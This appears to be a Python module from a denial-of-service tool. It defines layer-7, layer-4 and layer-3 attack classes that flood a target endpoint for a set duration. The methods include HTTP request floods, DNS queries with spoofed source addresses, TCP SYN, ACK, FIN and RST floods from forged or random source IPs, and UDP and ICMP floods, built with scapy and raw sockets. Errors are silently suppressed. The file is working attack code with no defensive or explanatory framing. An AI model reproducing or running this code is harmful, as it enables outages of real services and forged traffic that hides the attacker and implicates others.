import socket
import random
import string
import threading, time
from contextlib import suppress
from typing import Optional, Dict
from scapy.layers.dns import DNS, DNSQR
from datetime import datetime, timedelta
from scapy.all import IP, TCP, UDP, ICMP, send

from . import Endpoint, NetTools

class L7:
    def __init__(self, endpoint: Endpoint, duration: int = 30):
        self.endpoint: Endpoint = endpoint
        self.net_tools: NetTools = NetTools()
        self.until = datetime.now() + timedelta(seconds=duration)

    def _generate_payload(self, length: int = 256) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def send_tcp_request(
        self,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        body: str = "",
        body_len: int = 256,
        spoofed_ip: str = None,
    ) -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                if spoofed_ip:
                    s.bind((spoofed_ip, 0))
                s.connect((self.endpoint.host, self.endpoint.port))

                body = self._generate_payload(body_len)
                req: bytes = self.net_tools.build_request(self.endpoint, method, body)

                if headers:
                    header_lines = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
                    header_section = headers.encode() if isinstance(headers, bytes) else header_lines.encode()
                    req_parts = req.split(b"\r\n\r\n", 1)
                    if len(req_parts) == 2:
                            req = req_parts[0] + b"\r\n" + header_section + b"\r\n\r\n" + req_parts[1]
                    else:
                        req += header_section + b"\r\n\r\n"
                s.send(req)
                s.recv(4096)

    def GET(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, spoofed_ip: str = None) -> None:
        self.send_tcp_request("GET", headers, body, body_len, spoofed_ip)

    def POST(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, spoofed_ip: str = None) -> None:
        self.send_tcp_request("POST", headers, body, body_len, spoofed_ip)

    def HEAD(self, headers: Optional[Dict[str, str]] = None, spoofed_ip: str = None) -> None:
        self.send_tcp_request("HEAD", headers, spoofed_ip=spoofed_ip)

    def PUT(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, spoofed_ip: str = None) -> None:
        self.send_tcp_request("PUT", headers, body, body_len, spoofed_ip)

    def DELETE(self, headers: Optional[Dict[str, str]] = None, spoofed_ip: str = None) -> None:
        self.send_tcp_request("DELETE", headers, spoofed_ip=spoofed_ip)

    def DNS(self, spoofed_ip: str, domain: str = "google.com", qtype: str = "A") -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                send(
                    IP(src=spoofed_ip, dst=self.endpoint.host) /
                    UDP(sport=random.randint(1024, 65535), dport=self.endpoint.port) /
                    DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype)),
                    verbose=0
                )

class L4:
    def __init__(self, endpoint: Endpoint, duration: int):
        self.endpoint: Endpoint = endpoint
        self.net_tools: NetTools = NetTools()  # Added NetTools instance
        self.until = datetime.now() + timedelta(seconds=duration)

    def _send_tcp_flag(self, flags: str, spoofed_ip: str = None) -> None:
            while (self.until - datetime.now()).total_seconds() > 0:
                src_ip = spoofed_ip or self.net_tools.generate_spoofed_ip()
                send(
                    IP(src=src_ip, dst=self.endpoint.host) /
                    TCP(
                        sport=random.randint(1024, 65535),
                        dport=self.endpoint.port,
                        flags=flags,
                        seq=random.randint(0, 0xFFFFFFFF)
                    ),
                    verbose=0
                )
                time.sleep(0.01)  # Rate control

    def ACK(self, spoofed_ip: str = None) -> None:
        self._send_tcp_flag('A', spoofed_ip)

    def SYN(self, spoofed_ip: str = None) -> None:
        self._send_tcp_flag('S', spoofed_ip)

    def FIN(self, spoofed_ip: str = None) -> None:
        self._send_tcp_flag('F', spoofed_ip)

    def RST(self, spoofed_ip: str = None) -> None:
        self._send_tcp_flag('R', spoofed_ip)

    def TCP(self, spoofed_ip: str = None) -> None:
        self._send_tcp_flag('S', spoofed_ip)  # Default to SYN for generic TCP

    def UDP(self, message: bytes = b"hello", spoofed_ip: str = None) -> None:
        with suppress(Exception):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(10)
            if spoofed_ip:
                s.bind((spoofed_ip, 0))
            while (self.until - datetime.now()).total_seconds() > 0:
                s.sendto(message, (self.endpoint.host, self.endpoint.port))
                time.sleep(0.01)  # Rate control
            s.close()

class L3:
    def __init__(self, endpoint: Endpoint, duration: int):
        self.endpoint: Endpoint = endpoint
        self.net_tools: NetTools = NetTools()  # Added NetTools instance
        self.until = datetime.now() + timedelta(seconds=duration)

    def ICMP(self, payload: bytes = b"payload", spoofed_ip: str = None) -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                src_ip = spoofed_ip or self.net_tools.generate_spoofed_ip()
                send(
                    IP(src=src_ip, dst=self.endpoint.host) /
                    ICMP() /
                    payload,
                    verbose=0
                )
                time.sleep(0.01)  # Rate control